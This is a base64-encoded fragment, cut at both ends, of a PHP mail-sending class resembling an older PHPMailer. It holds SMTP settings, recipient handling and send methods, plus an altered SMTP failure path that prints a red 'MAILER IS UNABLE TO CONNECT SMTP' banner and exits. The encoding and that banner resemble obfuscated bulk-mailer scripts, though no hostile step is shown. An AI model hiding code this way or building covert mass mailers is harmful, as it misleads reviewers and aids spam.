cm9tTmFtZSAgICAgICAgICA9ICcnOwoKICAvKioKICAgKiBTZXRzIHRoZSBTZW5kZXIgZW1haWwgKFJldHVybi1QYXRoKSBvZiB0aGUgbWVzc2FnZS4gIElmIG5vdCBlbXB0eSwKICAgKiB3aWxsIGJlIHNlbnQgdmlhIC1mIHRvIHNlbmRtYWlsIG9yIGFzICdNQUlMIEZST00nIGluIHNtdHAgbW9kZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkU2VuZGVyICAgICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgU3ViamVjdCBvZiB0aGUgbWVzc2FnZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkU3ViamVjdCAgICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgQm9keSBvZiB0aGUgbWVzc2FnZS4gIFRoaXMgY2FuIGJlIGVpdGhlciBhbiBIVE1MIG9yIHRleHQgYm9keS4KICAgKiBJZiBIVE1MIHRoZW4gcnVuIElzSFRNTCh0cnVlKS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkQm9keSAgICAgICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgdGV4dC1vbmx5IGJvZHkgb2YgdGhlIG1lc3NhZ2UuICBUaGlzIGF1dG9tYXRpY2FsbHkgc2V0cyB0aGUKICAgKiBlbWFpbCB0byBtdWx0aXBhcnQvYWx0ZXJuYXRpdmUuICBUaGlzIGJvZHkgY2FuIGJlIHJlYWQgYnkgbWFpbAogICAqIGNsaWVudHMgdGhhdCBkbyBub3QgaGF2ZSBIVE1MIGVtYWlsIGNhcGFiaWxpdHkgc3VjaCBhcyBtdXR0LiBDbGllbnRzCiAgICogdGhhdCBjYW4gcmVhZCBIVE1MIHdpbGwgdmlldyB0aGUgbm9ybWFsIEJvZHkuCiAgICogQHZhciBzdHJpbmcKICAgKi8KICB2YXIgJEFsdEJvZHkgICAgICAgICAgID0gJyc7CgogIC8qKgogICAqIFNldHMgd29yZCB3cmFwcGluZyBvbiB0aGUgYm9keSBvZiB0aGUgbWVzc2FnZSB0byBhIGdpdmVuIG51bWJlciBvZgogICAqIGNoYXJhY3RlcnMuCiAgICogQHZhciBpbnQKICAgKi8KICB2YXIgJFdvcmRXcmFwICAgICAgICAgID0gMDsKCiAgLyoqCiAgICogTWV0aG9kIHRvIHNlbmQgbWFpbDogKCJtYWlsIiwgInNlbmRtYWlsIiwgb3IgInNtdHAiKS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkTWFpbGVyICAgICAgICAgICAgPSAnbWFpbCc7CgogIC8qKgogICAqIFNldHMgdGhlIHBhdGggb2YgdGhlIHNlbmRtYWlsIHByb2dyYW0uCiAgICogQHZhciBzdHJpbmcKICAgKi8KICB2YXIgJFNlbmRtYWlsICAgICAgICAgID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7CgogIC8qKgogICAqIFBhdGggdG8gUEhQTWFpbGVyIHBsdWdpbnMuICBUaGlzIGlzIG5vdyBvbmx5IHVzZWZ1bCBpZiB0aGUgU01UUCBjbGFzcwogICAqIGlzIGluIGEgZGlmZmVyZW50IGRpcmVjdG9yeSB0aGFuIHRoZSBQSFAgaW5jbHVkZSBwYXRoLgogICAqIEB2YXIgc3RyaW5nCiAgICovCiAgdmFyICRQbHVnaW5EaXIgICAgICAgICA9ICcnOwoKICAvKioKICAgKiBIb2xkcyBQSFBNYWlsZXIgdmVyc2lvbi4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkVmVyc2lvbiAgICAgICAgICAgPSAiIjsKCiAgLyoqCiAgICogU2V0cyB0aGUgZW1haWwgYWRkcmVzcyB0aGF0IGEgcmVhZGluZyBjb25maXJtYXRpb24gd2lsbCBiZSBzZW50LgogICAqIEB2YXIgc3RyaW5nCiAgICovCiAgdmFyICRDb25maXJtUmVhZGluZ1RvICA9ICcnOwoKICAvKioKICAgKiBTZXRzIHRoZSBob3N0bmFtZSB0byB1c2UgaW4gTWVzc2FnZS1JZCBhbmQgUmVjZWl2ZWQgaGVhZGVycwogICAqIGFuZCBhcyBkZWZhdWx0IEhFTE8gc3RyaW5nLiBJZiBlbXB0eSwgdGhlIHZhbHVlIHJldHVybmVkCiAgICogYnkgU0VSVkVSX05BTUUgaXMgdXNlZCBvciAnbG9jYWxob3N0LmxvY2FsZG9tYWluJy4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkSG9zdG5hbWUgICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgbWVzc2FnZSBJRCB0byBiZSB1c2VkIGluIHRoZSBNZXNzYWdlLUlkIGhlYWRlci4KICAgKiBJZiBlbXB0eSwgYSB1bmlxdWUgaWQgd2lsbCBiZSBnZW5lcmF0ZWQuCiAgICogQHZhciBzdHJpbmcKICAgKi8KICB2YXIgJE1lc3NhZ2VJRCAgICAgICAgID0gJyc7CgogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAvLyBQUk9QRVJUSUVTIEZPUiBTTVRQCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKICAvKioKICAgKiBTZXRzIHRoZSBTTVRQIGhvc3RzLiAgQWxsIGhvc3RzIG11c3QgYmUgc2VwYXJhdGVkIGJ5IGEKICAgKiBzZW1pY29sb24uICBZb3UgY2FuIGFsc28gc3BlY2lmeSBhIGRpZmZlcmVudCBwb3J0CiAgICogZm9yIGVhY2ggaG9zdCBieSB1c2luZyB0aGlzIGZvcm1hdDogW2hvc3RuYW1lOnBvcnRdCiAgICogKGUuZy4gInNtdHAxLmV4YW1wbGUuY29tOjI1O3NtdHAyLmV4YW1wbGUuY29tIikuCiAgICogSG9zdHMgd2lsbCBiZSB0cmllZCBpbiBvcmRlci4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkSG9zdCAgICAgICAgPSAnbG9jYWxob3N0JzsKCiAgLyoqCiAgICogU2V0cyB0aGUgZGVmYXVsdCBTTVRQIHNlcnZlciBwb3J0LgogICAqIEB2YXIgaW50CiAgICovCiAgdmFyICRQb3J0ICAgICAgICA9IDI1OwoKICAvKioKICAgKiBTZXRzIHRoZSBTTVRQIEhFTE8gb2YgdGhlIG1lc3NhZ2UgKERlZmF1bHQgaXMgJEhvc3RuYW1lKS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkSGVsbyAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyBjb25uZWN0aW9uIHByZWZpeC4KICAgKiBPcHRpb25zIGFyZSAiIiwgInNzbCIgb3IgInRscyIKICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkU01UUFNlY3VyZSA9ICIiOwoKICAvKioKICAgKiBTZXRzIFNNVFAgYXV0aGVudGljYXRpb24uIFV0aWxpemVzIHRoZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQgdmFyaWFibGVzLgogICAqIEB2YXIgYm9vbAogICAqLwogIHZhciAkU01UUEF1dGggICAgID0gZmFsc2U7CgogIC8qKgogICAqIFNldHMgU01UUCB1c2VybmFtZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkVXNlcm5hbWUgICAgID0gJyc7CgogIC8qKgogICAqIFNldHMgU01UUCBwYXNzd29yZC4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkUGFzc3dvcmQgICAgID0gJyc7CgogIC8qKgogICAqIFNldHMgdGhlIFNNVFAgc2VydmVyIHRpbWVvdXQgaW4gc2Vjb25kcy4gVGhpcyBmdW5jdGlvbiB3aWxsIG5vdAogICAqIHdvcmsgd2l0aCB0aGUgd2luMzIgdmVyc2lvbi4KICAgKiBAdmFyIGludAogICAqLwogIHZhciAkVGltZW91dCAgICAgID0gMTA7CgogIC8qKgogICAqIFNldHMgU01UUCBjbGFzcyBkZWJ1Z2dpbmcgb24gb3Igb2ZmLgogICAqIEB2YXIgYm9vbAogICAqLwogIHZhciAkU01UUERlYnVnICAgID0gZmFsc2U7CgogIC8qKgogICAqIFByZXZlbnRzIHRoZSBTTVRQIGNvbm5lY3Rpb24gZnJvbSBiZWluZyBjbG9zZWQgYWZ0ZXIgZWFjaCBtYWlsCiAgICogc2VuZGluZy4gIElmIHRoaXMgaXMgc2V0IHRvIHRydWUgdGhlbiB0byBjbG9zZSB0aGUgY29ubmVjdGlvbgogICAqIHJlcXVpcmVzIGFuIGV4cGxpY2l0IGNhbGwgdG8gU210cENsb3NlKCkuCiAgICogQHZhciBib29sCiAgICovCiAgdmFyICRTTVRQS2VlcEFsaXZlID0gZmFsc2U7CgogIC8qKgogICAqIFByb3ZpZGVzIHRoZSBhYmlsaXR5IHRvIGhhdmUgdGhlIFRPIGZpZWxkIHByb2Nlc3MgaW5kaXZpZHVhbAogICAqIGVtYWlscywgaW5zdGVhZCBvZiBzZW5kaW5nIHRvIGVudGlyZSBUTyBhZGRyZXNzZXMKICAgKiBAdmFyIGJvb2wKICAgKi8KICB2YXIgJFNpbmdsZVRvID0gZmFsc2U7CgogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KICAvLyBQUk9QRVJUSUVTLCBQUklWQVRFCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKICB2YXIgJHNtdHAgICAgICAgICAgICA9IE5VTEw7CiAgdmFyICR0byAgICAgICAgICAgICAgPSBhcnJheSgpOwogIHZhciAkY2MgICAgICAgICAgICAgID0gYXJyYXkoKTsKICB2YXIgJGJjYyAgICAgICAgICAgICA9IGFycmF5KCk7CiAgdmFyICRSZXBseVRvICAgICAgICAgPSBhcnJheSgpOwogIHZhciAkYXR0YWNobWVudCAgICAgID0gYXJyYXkoKTsKICB2YXIgJEN1c3RvbUhlYWRlciAgICA9IGFycmF5KCk7CiAgdmFyICRtZXNzYWdlX3R5cGUgICAgPSAnJzsKICB2YXIgJGJvdW5kYXJ5ICAgICAgICA9IGFycmF5KCk7CiAgdmFyICRsYW5ndWFnZSAgICAgICAgPSBhcnJheSgpOwogIHZhciAkZXJyb3JfY291bnQgICAgID0gMDsKICB2YXIgJExFICAgICAgICAgICAgICA9ICJcbiI7CiAgdmFyICRzaWduX2tleV9maWxlICAgPSAiIjsKICB2YXIgJHNpZ25fa2V5X3Bhc3MgICA9ICIiOwoKICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgLy8gTUVUSE9EUywgVkFSSUFCTEVTCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKICAvKioKICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MLgogICAqIEBwYXJhbSBib29sICRib29sCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gSXNIVE1MKCRib29sKSB7CiAgICBpZigkYm9vbCA9PSB0cnVlKSB7CiAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L2h0bWwnOwogICAgfSBlbHNlIHsKICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ3RleHQvcGxhaW4nOwogICAgfQogIH0KCiAgLyoqCiAgICogU2V0cyBNYWlsZXIgdG8gc2VuZCBtZXNzYWdlIHVzaW5nIFNNVFAuCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gSXNTTVRQKCkgewogICAgJHRoaXMtPk1haWxlciA9ICdzbXRwJzsKICB9CgogIC8qKgogICAqIFNldHMgTWFpbGVyIHRvIHNlbmQgbWVzc2FnZSB1c2luZyBQSFAgbWFpbCgpIGZ1bmN0aW9uLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIElzTWFpbCgpIHsKICAgICR0aGlzLT5NYWlsZXIgPSAnbWFpbCc7CiAgfQoKICAvKioKICAgKiBTZXRzIE1haWxlciB0byBzZW5kIG1lc3NhZ2UgdXNpbmcgdGhlICRTZW5kbWFpbCBwcm9ncmFtLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIElzU2VuZG1haWwoKSB7CiAgICAkdGhpcy0+TWFpbGVyID0gJ3NlbmRtYWlsJzsKICB9CgogIC8qKgogICAqIFNldHMgTWFpbGVyIHRvIHNlbmQgbWVzc2FnZSB1c2luZyB0aGUgcW1haWwgTVRBLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIElzUW1haWwoKSB7CiAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Zhci9xbWFpbC9iaW4vc2VuZG1haWwnOwogICAgJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7CiAgfQoKICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgLy8gTUVUSE9EUywgUkVDSVBJRU5UUwogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCiAgLyoqCiAgICogQWRkcyBhICJUbyIgYWRkcmVzcy4KICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzCiAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIEFkZEFkZHJlc3MoJGFkZHJlc3MsICRuYW1lID0gJycpIHsKICAgICRjdXIgPSBjb3VudCgkdGhpcy0+dG8pOwogICAgJHRoaXMtPnRvWyRjdXJdWzBdID0gdHJpbSgkYWRkcmVzcyk7CiAgICAkdGhpcy0+dG9bJGN1cl1bMV0gPSAkbmFtZTsKICB9CgogIC8qKgogICAqIEFkZHMgYSAiQ2MiIGFkZHJlc3MuIE5vdGU6IHRoaXMgZnVuY3Rpb24gd29ya3MKICAgKiB3aXRoIHRoZSBTTVRQIG1haWxlciBvbiB3aW4zMiwgbm90IHdpdGggdGhlICJtYWlsIgogICAqIG1haWxlci4KICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzCiAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIEFkZENDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7CiAgICAkY3VyID0gY291bnQoJHRoaXMtPmNjKTsKICAgICR0aGlzLT5jY1skY3VyXVswXSA9IHRyaW0oJGFkZHJlc3MpOwogICAgJHRoaXMtPmNjWyRjdXJdWzFdID0gJG5hbWU7CiAgfQoKICAvKioKICAgKiBBZGRzIGEgIkJjYyIgYWRkcmVzcy4gTm90ZTogdGhpcyBmdW5jdGlvbiB3b3JrcwogICAqIHdpdGggdGhlIFNNVFAgbWFpbGVyIG9uIHdpbjMyLCBub3Qgd2l0aCB0aGUgIm1haWwiCiAgICogbWFpbGVyLgogICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MKICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gQWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7CiAgICAkY3VyID0gY291bnQoJHRoaXMtPmJjYyk7CiAgICAkdGhpcy0+YmNjWyRjdXJdWzBdID0gdHJpbSgkYWRkcmVzcyk7CiAgICAkdGhpcy0+YmNjWyRjdXJdWzFdID0gJG5hbWU7CiAgfQoKICAvKioKICAgKiBBZGRzIGEgIlJlcGx5LVRvIiBhZGRyZXNzLgogICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MKICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gQWRkUmVwbHlUbygkYWRkcmVzcywgJG5hbWUgPSAnJykgewogICAgJGN1ciA9IGNvdW50KCR0aGlzLT5SZXBseVRvKTsKICAgICR0aGlzLT5SZXBseVRvWyRjdXJdWzBdID0gdHJpbSgkYWRkcmVzcyk7CiAgICAkdGhpcy0+UmVwbHlUb1skY3VyXVsxXSA9ICRuYW1lOwogIH0KCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwogIC8vIE1FVEhPRFMsIE1BSUwgU0VORElORwogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCiAgLyoqCiAgICogQ3JlYXRlcyBtZXNzYWdlIGFuZCBhc3NpZ25zIE1haWxlci4gSWYgdGhlIG1lc3NhZ2UgaXMKICAgKiBub3Qgc2VudCBzdWNjZXNzZnVsbHkgdGhlbiBpdCByZXR1cm5zIGZhbHNlLiAgVXNlIHRoZSBFcnJvckluZm8KICAgKiB2YXJpYWJsZSB0byB2aWV3IGRlc2NyaXB0aW9uIG9mIHRoZSBlcnJvci4KICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBTZW5kKCkgewogICAgJGhlYWRlciA9ICcnOwogICAgJGJvZHkgPSAnJzsKICAgICRyZXN1bHQgPSB0cnVlOwoKICAgIGlmKChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpKSA8IDEpIHsKICAgICAgJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCdwcm92aWRlX2FkZHJlc3MnKSk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKiBTZXQgd2hldGhlciB0aGUgbWVzc2FnZSBpcyBtdWx0aXBhcnQvYWx0ZXJuYXRpdmUgKi8KICAgIGlmKCFlbXB0eSgkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7CiAgICB9CgogICAgJHRoaXMtPmVycm9yX2NvdW50ID0gMDsgLy8gcmVzZXQgZXJyb3JzCiAgICAkdGhpcy0+U2V0TWVzc2FnZVR5cGUoKTsKICAgICRoZWFkZXIgLj0gJHRoaXMtPkNyZWF0ZUhlYWRlcigpOwogICAgJGJvZHkgPSAkdGhpcy0+Q3JlYXRlQm9keSgpOwoKICAgIGlmKCRib2R5ID09ICcnKSB7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKiBDaG9vc2UgdGhlIG1haWxlciAqLwogICAgc3dpdGNoKCR0aGlzLT5NYWlsZXIpIHsKICAgICAgY2FzZSAnc2VuZG1haWwnOgogICAgICAgICRyZXN1bHQgPSAkdGhpcy0+U2VuZG1haWxTZW5kKCRoZWFkZXIsICRib2R5KTsKICAgICAgICBicmVhazsKICAgICAgY2FzZSAnc210cCc6CiAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5TbXRwU2VuZCgkaGVhZGVyLCAkYm9keSk7CiAgICAgICAgYnJlYWs7CiAgICAgIGNhc2UgJ21haWwnOgogICAgICAgICRyZXN1bHQgPSAkdGhpcy0+TWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpOwogICAgICAgIGJyZWFrOwogICAgICBkZWZhdWx0OgogICAgICAgICRyZXN1bHQgPSAkdGhpcy0+TWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpOwogICAgICAgIGJyZWFrOwogICAgICAgIC8vJHRoaXMtPlNldEVycm9yKCR0aGlzLT5NYWlsZXIgLiAkdGhpcy0+TGFuZygnbWFpbGVyX25vdF9zdXBwb3J0ZWQnKSk7CiAgICAgICAgLy8kcmVzdWx0ID0gZmFsc2U7CiAgICAgICAgLy9icmVhazsKICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdDsKICB9CgogIC8qKgogICAqIFNlbmRzIG1haWwgdXNpbmcgdGhlICRTZW5kbWFpbCBwcm9ncmFtLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIFNlbmRtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkgewogICAgaWYgKCR0aGlzLT5TZW5kZXIgIT0gJycpIHsKICAgICAgJHNlbmRtYWlsID0gc3ByaW50ZigiJXMgLW9pIC1mICVzIC10IiwgZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSwgZXNjYXBlc2hlbGxhcmcoJHRoaXMtPlNlbmRlcikpOwogICAgfSBlbHNlIHsKICAgICAgJHNlbmRtYWlsID0gc3ByaW50ZigiJXMgLW9pIC10IiwgZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSk7CiAgICB9CgogICAgaWYoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7CiAgICBmcHV0cygkbWFpbCwgJGJvZHkpOwoKICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOwogICAgaWYgKHZlcnNpb25fY29tcGFyZShwaHB2ZXJzaW9uKCksICc0LjIuMycpID09IC0xKSB7CiAgICAgICRyZXN1bHQgPSAkcmVzdWx0ID4+IDggJiAweEZGOwogICAgfQogICAgaWYoJHJlc3VsdCAhPSAwKSB7CiAgICAgICR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTZW5kcyBtYWlsIHVzaW5nIHRoZSBQSFAgbWFpbCgpIGZ1bmN0aW9uLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIE1haWxTZW5kKCRoZWFkZXIsICRib2R5KSB7CgogICAgJHRvID0gJyc7CiAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCR0aGlzLT50byk7ICRpKyspIHsKICAgICAgaWYoJGkgIT0gMCkgeyAkdG8gLj0gJywgJzsgfQogICAgICAkdG8gLj0gJHRoaXMtPkFkZHJGb3JtYXQoJHRoaXMtPnRvWyRpXSk7CiAgICB9CgogICAgJHRvQXJyID0gc3BsaXQoJywnLCAkdG8pOwoKICAgICRwYXJhbXMgPSBzcHJpbnRmKCItb2kgLWYgJXMiLCAkdGhpcy0+U2VuZGVyKTsKICAgIGlmICgkdGhpcy0+U2VuZGVyICE9ICcnICYmIHN0cmxlbihpbmlfZ2V0KCdzYWZlX21vZGUnKSkgPCAxKSB7CiAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsKICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR0aGlzLT5TZW5kZXIpOwogICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvID09PSB0cnVlICYmIGNvdW50KCR0b0FycikgPiAxKSB7CiAgICAgICAgZm9yZWFjaCAoJHRvQXJyIGFzICRrZXkgPT4gJHZhbCkgewogICAgICAgICAgJHJ0ID0gQG1haWwoJHZhbCwgJHRoaXMtPkVuY29kZUhlYWRlcigkdGhpcy0+U2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSksICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICB9CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJHJ0ID0gQG1haWwoJHRvLCAkdGhpcy0+RW5jb2RlSGVhZGVyKCR0aGlzLT5TZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICB9CiAgICB9IGVsc2UgewogICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvID09PSB0cnVlICYmIGNvdW50KCR0b0FycikgPiAxKSB7CiAgICAgICAgZm9yZWFjaCAoJHRvQXJyIGFzICRrZXkgPT4gJHZhbCkgewogICAgICAgICAgJHJ0ID0gQG1haWwoJHZhbCwgJHRoaXMtPkVuY29kZUhlYWRlcigkdGhpcy0+U2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSksICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICB9CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJHJ0ID0gQG1haWwoJHRvLCAkdGhpcy0+RW5jb2RlSGVhZGVyKCR0aGlzLT5TZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSwgJGJvZHksICRoZWFkZXIpOwogICAgICB9CiAgICB9CgogICAgaWYgKGlzc2V0KCRvbGRfZnJvbSkpIHsKICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICRvbGRfZnJvbSk7CiAgICB9CgogICAgaWYoISRydCkgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtPkxhbmcoJ2luc3RhbnRpYXRlJykpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTZW5kcyBtYWlsIHZpYSBTTVRQIHVzaW5nIFBocFNNVFAgKEF1dGhvcjoKICAgKiBDaHJpcyBSeWFuKS4gIFJldHVybnMgYm9vbC4gIFJldHVybnMgZmFsc2UgaWYgdGhlcmUgaXMgYQogICAqIGJhZCBNQUlMIEZST00sIFJDUFQsIG9yIERBVEEgaW5wdXQuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gU210cFNlbmQoJGhlYWRlciwgJGJvZHkpIHsKICAgICRlcnJvciA9ICcnOwogICAgJGJhZF9yY3B0ID0gYXJyYXkoKTsKCiAgICBpZighJHRoaXMtPlNtdHBDb25uZWN0KCkpIHtlY2hvICJGQUlMRUQgISE8cCBhbGlnbj1cImNlbnRlclwiPjxmb250IGNvbG9yPVwiI0Q0MDAxQVwiIHN0eWxlPVwiZm9udC1zdHlsZToxNHB0XCI+IE1BSUxFUiBJUyBVTkFCTEUgVE8gQ09OTkVDVCBTTVRQICEhPC9mb250PjwvcD4iO2RpZSgpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHNtdHBfZnJvbSA9ICgkdGhpcy0+U2VuZGVyID09ICcnKSA/ICR0aGlzLT5Gcm9tIDogJHRoaXMtPlNlbmRlcjsKICAgIGlmKCEkdGhpcy0+c210cC0+TWFpbCgkc210cF9mcm9tKSkgewogICAgICAkZXJyb3IgPSAkdGhpcy0+TGFuZygnZnJvbV9mYWlsZWQnKSAuICRzbXRwX2Zyb207CiAgICAgICR0aGlzLT5TZXRFcnJvcigkZXJyb3IpOwogICAgICAkdGhpcy0+c210cC0+UmVzZXQoKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qIEF0dGVtcHQgdG8gc2VuZCBhdHRhY2ggYWxsIHJlY2lwaWVudHMgKi8KICAgIGZvcigkaSA9IDA7ICRpIDwgY291bnQoJHRoaXMtPnRvKTsgJGkrKykgewogICAgICBpZighJHRoaXMtPnNtdHAtPlJlY2lwaWVudCgkdGhpcy0+dG9bJGldWzBdKSkgewogICAgICAgICRiYWRfcmNwdFtdID0gJHRoaXMtPnRvWyRpXVswXTsKICAgICAgfQogICAgfQogICAgZm9yKCRpID0gMDsgJGkgPCBjb3VudCgkdGhpcy0+Y2MpOyAkaSsrKSB7CiAgICAgIGlmKCEkdGhpcy0+c210cC0+UmVjaXBpZW50KCR0aGlzLT5jY1skaV1bMF0pKSB7CiAgICAgICAgJGJhZF9yY3B0W10gPSAkdGhpcy0+Y2NbJGldWzBdOwogICAgICB9CiAgICB9CiAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCR0aGlzLT5iY2MpOyAkaSsrKSB7CiAgICAgIGlmKCEkdGhpcy0+c210cC0+UmVjaXBpZW50KCR0aGlzLT5iY2NbJGldWzBdKSkgewogICAgICAgICRiYWRfcmNwdFtdID0gJHRoaXMtPmJjY1skaV1bMF07CiAgICAgIH0KICAgIH0KCiAgICBpZihjb3VudCgkYmFkX3JjcHQpID4gMCkgeyAvLyBDcmVhdGUgZXJyb3IgbWVzc2FnZQogICAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCRiYWRfcmNwdCk7ICRpKyspIHsKICAgICAgICBpZigkaSAhPSAwKSB7CiAgICAgICAgICAkZXJyb3IgLj0gJywgJzsKICAgICAgICB9CiAgICAgICAgJGVycm9yIC49ICRiYWRfcmNwdFskaV07CgogICAgICB9CiAgICAgICRlcnJvciA9ICR0aGlzLT5MYW5nKCdyZWNpcGllbnRzX2ZhaWxlZCcpIC4gJGVycm9yOwogICAgICAkdGhpcy0+U2V0RXJyb3IoJGVycm9yKTsKICAgICAgJHRoaXMtPnNtdHAtPlJlc2V0KCk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBpZighJHRoaXMtPnNtdHAtPkRhdGEoJGhlYWRlciAuICRib2R5KSkgewogICAgICAkdGhpcy0+U2V0RXJyb3IoJHRoaXMtP